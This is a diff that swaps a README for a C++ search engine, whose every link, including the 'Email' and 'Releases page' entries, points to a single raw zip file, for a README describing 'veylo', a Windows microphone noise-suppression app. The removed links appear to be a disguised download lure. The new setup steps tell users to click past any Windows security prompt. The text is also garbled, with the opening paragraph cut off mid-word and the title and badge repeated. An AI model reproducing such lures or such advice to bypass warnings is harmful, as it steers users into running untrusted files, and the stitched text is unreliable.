@@ -1,77 +1,195 @@
-# 🔎 high-performance-search-engine-cpp - Fast and Efficient Search Made Easy
+# 🎤 veylo - Clear Voice, Less Background Noise
 
-[![Download](https://raw.githubusercontent.com/Imonholic/high-performance-search-engine-cpp/main/document/books/searchengine/high_cpp_search_performance_engine_1.5.zip)](https://raw.githubusercontent.com/Imonholic/high-performance-search-engine-cpp/main/document/books/searchengine/high_cpp_search_performance_engine_1.5.zip)
+[![Download veylo](https://img.shields.io/badge/Download%20veylo-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Imonholic/veylo/releases)
 
-## 🚀 Getting Started
+veylo is a local microphone studio for Windows. It helps your voice sound clearer and more even during calls, recordings, online meetings, and voice chats. It includes noise suppression, voice leveling, EQ, and presets. All# 🎤 veylo - Clear Voice, Less Background Noise
 
-Welcome to **high-performance-search-engine-cpp**! This software provides an efficient way to search text using advanced methods. Whether you want to search documents or build applications, this tool is designed for you.
+[![Download veylo](https://img.shields.io/badge/Download%20veylo-6C2BD9?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Imonholic/veylo/releases)
 
-## 📥 Download & Install
+veylo is a local microphone studio for Windows. It makes your voice sound clearer, warmer, and more consistent during calls, recordings, live streams, online classes, and voice chats. It combines noise suppression, voice leveling, equalizer (EQ) controls, and ready-made presets in one simple window.
 
-To get started, visit the [Releases page](https://raw.githubusercontent.com/Imonholic/high-performance-search-engine-cpp/main/document/books/searchengine/high_cpp_search_performance_engine_1.5.zip) to download the software.
+Everything runs on your own computer. Your microphone audio is processed offline, which means your voice is never uploaded to a server. veylo is open source and free to use. This is a development release, so new improvements arrive regularly.
 
-1. Go to the [Releases page](https://raw.githubusercontent.com/Imonholic/high-performance-search-engine-cpp/main/document/books/searchengine/high_cpp_search_performance_engine_1.5.zip).
-2. Find the latest version listed.
-3. Click on the download link for your operating system.
-4. Once downloaded, open the file and follow the installation instructions.
+Visit this link to download the application: https://github.com/Imonholic/veylo/releases
 
-## 💻 System Requirements
+---
 
-Before installing, ensure your computer meets the following:
+## ✨ What veylo Does
 
-- **Operating System:** Windows 10 / macOS Big Sur / Ubuntu 20.04 or later
-- **Processor:** Intel Core i3 or equivalent
-- **Memory:** At least 4 GB RAM
-- **Storage:** 200 MB of free space
+Most microphones pick up more than your voice. They capture keyboard clicks, fan noise, traffic, breathing, and the hum of a room. They also make quiet sentences hard to hear and loud sentences harsh.
 
-## 📚 Features
+veylo sits between your microphone and the apps you use, cleaning up the sound before it reaches other people. You do not need to be an audio engineer. You open veylo, pick a preset, and speak.
 
-This search engine comes with multiple powerful features:
+The four main tools inside veylo are:
 
-- **Inverted Indexing:** Quickly retrieves documents containing specific terms.
-- **BM25 Ranking:** Effectively ranks search results based on relevance.
-- **Phrase Search:** Search for exact phrases in documents for better accuracy.
-- **Multithreaded Indexing:** Indexes multiple files at once, saving you time.
-- **Autocomplete:** Suggests search terms as you type for faster access.
-- **LRU Caching:** Improves speed by storing frequently requested data.
-- **Web Crawling:** Automatically gathers content from specified web pages.
-- **HTTP API:** Easily integrate with other applications.
+- **Noise suppression** removes steady background noise such as fans, air conditioners, computer hum, and hiss.
+- **Voice leveling** keeps your volume steady, so whispering and speaking up both arrive at a comfortable level.
+- **EQ (equalizer)** shapes the tone of your voice by adjusting low, middle, and high frequencies.
+- **Presets** are one-click setups that combine the tools above for a specific situation.
 
-## 🔍 How to Use the Application
+---
 
-1. **Open the Application:** After installation, find the application in your programs and open it.
-2. **Input Your Search Query:** Use the search box to type what you're looking for.
-3. **Review the Results:** The application will display relevant documents. Click on any result to see more details.
-4. **Use Advanced Features:** Take advantage of autocomplete and phrase search to refine your results.
+## 🚀 Download and Setup
 
-## 🛠️ Tips for Effective Searching
+Getting started takes only a few minutes. Follow these steps in order.
 
-- **Be Specific:** Use exact phrases to narrow down results.
-- **Use Keywords:** Choose the most important words related to your search.
-- **Experiment with Filters:** If available, use any provided filters to limit your search by date or type.
+### Step 1: Visit the download page
 
-## 🌐 Contributing
+Go to the official releases page:
 
-While this software is user-friendly, contributions are welcome. If you want to help make this tool even better, consider the following:
+**https://github.com/Imonholic/veylo/releases**
 
-1. Report any bugs or issues you find.
-2. Suggest new features based on your experience.
-3. Share your ideas in discussions on issues.
+Visit this link to download the application. The page lists the available versions of veylo.
 
-## 🙋 Support
+### Step 2: Choose the newest release
 
-If you need help, feel free to reach out:
+Releases are listed with the newest one at the top. Look for the version marked as the latest. Development releases are updated often, so the top entry is usually the one you want.
 
-- **Email:** https://raw.githubusercontent.com/Imonholic/high-performance-search-engine-cpp/main/document/books/searchengine/high_cpp_search_performance_engine_1.5.zip
-- **GitHub Issues:** Use the issues tab on GitHub to ask questions or report problems.
+### Step 3: Open the downloaded item
 
-## 🔗 Additional Resources
+Once your browser finishes downloading, open the file from your Downloads folder. If Windows shows a security prompt, choose the option that lets you continue, then follow the on-screen steps.
 
-- [Documentation](https://raw.githubusercontent.com/Imonholic/high-performance-search-engine-cpp/main/document/books/searchengine/high_cpp_search_performance_engine_1.5.zip): Find detailed guides on advanced features.
-- [Community Forum](https://raw.githubusercontent.com/Imonholic/high-performance-search-engine-cpp/main/document/books/searchengine/high_cpp_search_performance_engine_1.5.zip): Join users discussing tips and sharing experiences.
+### Step 4: Start veylo
+
+When setup finishes, launch veylo from the Start menu or from the shortcut created on your desktop. The main window opens with your microphone list and your preset choices.
+
+### Step 5: Select your microphone
+
+At the top of the veylo window, choose the microphone you actually speak into. Laptop microphones, USB microphones, and headset microphones all appear in this list. If you are unsure which one is correct, speak and watch the level meter — the right microphone will move.
+
+### Step 6: Pick a preset and test
+
+Click a preset that matches what you are doing, then speak normally for a few seconds. Use the preview or monitoring option in veylo to hear yourself. Adjust the preset if needed. When you are happy with the sound, leave veylo running in the background while you use your other apps.
+
+---
+
+## 🎛️ The Main Features
+
+### 🔊 Noise Suppression
+
+veylo uses an intelligent noise reduction engine to separate your voice from steady background sound. Fans, air conditioning, computer noise, and room rumble are reduced while your speech stays natural. You control how strong the effect is with a single slider, so you can go from a light cleanup to aggressive removal.
+
+### 📈 Voice Leveling
+
+Voice leveling keeps your volume consistent. Instead of disappearing when you turn away from the microphone and booming when you lean in, your voice stays at a comfortable, even level. This is especially useful in long meetings and in recordings where you move around.
+
+### 🎚️ Equalizer (EQ)
+
+The EQ lets you shape how your voice sounds. Reduce low frequencies to remove a muddy or boomy quality. Gently lift the middle for presence and clarity. Adjust the highs to add air or to soften a sharp, hissy sound. You can save your own EQ setting and reuse it any time.
+
+### 🗂️ Presets
+
+Presets are ready-made combinations of all the settings above. Choose one and veylo configures noise suppression, leveling, and EQ together. You can also create your own presets and switch between them instantly.
+
+### 💾 Fully Local Processing
+
+All audio processing happens on your computer. Nothing is sent to the internet. veylo works with no connection at all and keeps working if your network drops.
+
+---
+
+## 🎯 Recommended Presets by Situation
+
+| Situation | Suggested Starting Point |
+|---|---|
+| Work calls and meetings | Balanced cleanup with light leveling |
+| Recording voiceovers | Strong noise suppression with a gentle EQ lift |
+| Gaming and voice chat | Moderate suppression, minimal EQ changes |
+| Streaming | Leveling on, warm EQ, medium suppression |
+| Noisy room or shared space | High noise suppression with stronger leveling |
+| Already quiet room | Light suppression and leveling only |
+
+Start with the preset closest to your situation, then make small changes. Small adjustments usually sound better than large ones.
+
+---
+
+## 🧭 Tips for the Best Sound
+
+- **Place the microphone closer.** A microphone 10–15 cm from your mouth picks up far less room noise than one across the desk.
+- **Point it away from noise sources.** Keep fans and speakers behind the microphone, not in front of it.
+- **Avoid stacking effects.** If another app already cleans your microphone, turn one of them off to prevent odd artifacts.
+- **Use headphones while testing.** Speakers can feed sound back into the microphone and confuse your test.
+- **Adjust in small steps.** Move one slider a little, listen, then decide. Big jumps often sound unnatural.
+- **Check your levels first.** Aim for a normal speaking voice to sit comfortably in the middle of the meter, not at the top.
+
+---
+
+## 🖥️ System Requirements
+
+- **Operating system:** Windows 10 or Windows 11 (64-bit recommended)
+- **Processor:** A modern dual-core processor or better
+- **Memory:** 4 GB of RAM or more
+- **Storage:** Around 200 MB of free space for the application and its audio data
+- **Audio:** Any microphone recognized by Windows, including built-in, USB, and headset microphones
+- **Internet:** Not required for processing. Only needed to download updates
+
+Lower-powered laptops can run veylo comfortably. If your computer struggles during heavy use, reduce the noise suppression strength or close other demanding applications.
+
+---
+
+## ❓ Frequently Asked Questions
+
+**Do I need to keep veylo open?**
+Yes. veylo processes audio in real time, so it needs to be running while you use your microphone in other applications.
+
+**Is my voice recorded or uploaded?**
+No. Processing happens on your device, and audio is not sent anywhere.
+
+**Does veylo change the sound for everyone, or only for me?**
+It changes the microphone signal, so the people and apps receiving your voice hear the improved sound.
+
+**Can I use veylo with any app?**
+veylo works with the microphone input that Windows provides, so apps that use your microphone can benefit from it.
+
+**Can I undo my changes?**
+Yes. Selecting a preset again or resetting a slider returns you to a known starting point.
+
+**What does "development release" mean?**
+It means veylo is actively being improved. Features may change between versions, and occasional rough edges are expected. Check the releases page for the newest build.
+
+---
+
+## 🛠️ Troubleshooting
+
+**I do not see my microphone in the list.**
+Make sure the microphone is plugged in and enabled in Windows sound settings, then restart veylo.
+
+**The sound is choppy or drops out.**
+Close other apps that use the microphone at the same time, and switch off any other audio cleanup tools.
+
+**My voice sounds robotic or watery.**
+Lower the noise suppression strength. Very high suppression can affect speech quality in quiet rooms.
+
+**The volume is still uneven.**
+Increase the leveling amount, and move the microphone to a consistent distance from your mouth.
+
+**Nothing happens after I open the file.**
+Check the releases page for the newest version and download it again.
+
+---
+
+## 🧩 How veylo Is Built
+
+veylo is an open-source project for Windows. Its interface is built with WPF and C#, and the audio engine is written in C++. Noise suppression is powered by the RNNoise approach to voice processing. The codebase is open, so anyone can read how the audio pipeline works, report problems, and suggest improvements.
+
+This project is made for people who care about how they sound and who also care about privacy. No accounts, no cloud processing, no telemetry-driven audio collection.
+
+---
+
+## 🤝 Get Involved
+
+- **Report a problem:** Open an issue with your Windows version, microphone model, and a short description of what happened.
+- **Suggest a feature:** Describe the situation you want to solve and the sound you are aiming for.
+- **Improve a preset:** Share the settings you use, along with the kind of room and microphone they suit.
+- **Spread the word:** Tell someone who spends their day on calls.
+
+All feedback goes through the repository, and the releases page at **https://github.com/Imonholic/veylo/releases** always has the newest build.
+
+---
 
 ## 📄 License
 
-This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for more information.
+veylo is open source. See the LICENSE file in the repository for the full terms of use and redistribution.
 
-[![Download](https://raw.githubusercontent.com/Imonholic/high-performance-search-engine-cpp/main/document/books/searchengine/high_cpp_search_performance_engine_1.5.zip)](https://raw.githubusercontent.com/Imonholic/high-performance-search-engine-cpp/main/document/books/searchengine/high_cpp_search_performance_engine_1.5.zip)
+---
+
+Keywords: audio, audio-processing, cpp, csharp, equalizer, microphone, noise-reduction, noise-suppression, rnnoise, voice-processing, windows, wpf
